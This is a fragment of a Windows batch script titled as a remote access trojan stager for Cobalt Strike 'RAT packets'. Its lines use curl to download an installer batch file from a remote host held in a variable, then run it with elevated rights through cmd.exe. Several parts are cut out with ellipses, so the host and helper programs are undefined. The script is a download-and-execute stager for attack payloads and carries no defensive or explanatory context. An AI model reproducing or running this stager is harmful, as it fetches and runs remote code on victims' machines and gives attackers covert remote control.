@echo on
rem *******************************************************
rem nit-coba-remote-RAT.bat
rem This Script Runs Computer - Independent Instructions
rem for NIT Cobalt Strike RAT Packets (RunOnce Tasks)
rem
...
rem
set Stalin_Install=stalin1234.install.bat
...
%CURLEXE% %host00301%%Stalin_Install% -o %LocalFolder%\%Stalin_Install%

echo == Install or Run Payloads ==
rem

rem Install Stalin Payloads ===
%ELEEXE% cmd.exe /c %LocalFolder%\%Stalin_Install%
